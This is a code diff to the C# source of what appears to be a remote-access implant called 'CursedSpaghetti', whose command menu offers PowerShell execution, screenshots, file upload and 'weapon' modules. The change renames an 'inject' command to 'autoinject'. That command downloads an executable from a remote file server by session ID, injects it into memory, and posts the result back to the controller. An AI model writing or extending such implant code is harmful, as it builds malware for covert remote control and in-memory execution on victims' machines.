@@ -25,7 +25,7 @@ namespace CursedSpaghetti
                 "   powershell <command>    Run powershell command\n" +
                 "   screnshot               Take a screenshot\n" +
                 "   session                 Get session ID\n" +
-                "   upload                  Upload file" +
+                "   upload                  Upload file\n" +
                 "   weapon                  Use a weapon module\n";
 
         }
@@ -37,7 +37,7 @@ namespace CursedSpaghetti
                     " ----------------------------------------------------------\n" +
                     "   basicenum               Basic enumeration\n" +
                     "   help                    Print this message\n" +
-                    "   inject                  Inject an executable into the memory\n";
+                    "   autoinject              Inject an executable into the memory\n";
 
             }
         }
@@ -98,18 +98,20 @@ namespace CursedSpaghetti
         public static void ChooseWeapon(string fs_url, string url, string weapon, string sessionid)
         {
             weapon = weapon.Substring(7);
+            string output;
 
             switch (weapon.Split(' ')[0].ToLower())
             {
                 case "basicenum":
                     Gatherer.ListBasicOSInfo(url);
                     break;
-                case "inject":
-                    string targetFile = weapon.Substring(7).Replace(" ", "");
-                    Injector.Inject(String.Format("{0}/{1}/{2}", fs_url, sessionid, targetFile));
+                case "autoinject":
+                    string targetFile = weapon.Substring(11).Replace(" ", "");
+                    output = Injector.Inject(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
+                    Post(url, output);
                     break;
                 case "help":
-                    string output = WeaponHelp();
+                    output = WeaponHelp();
                     Utilities.Post(url, output.ToString());
                     break;
                 default:
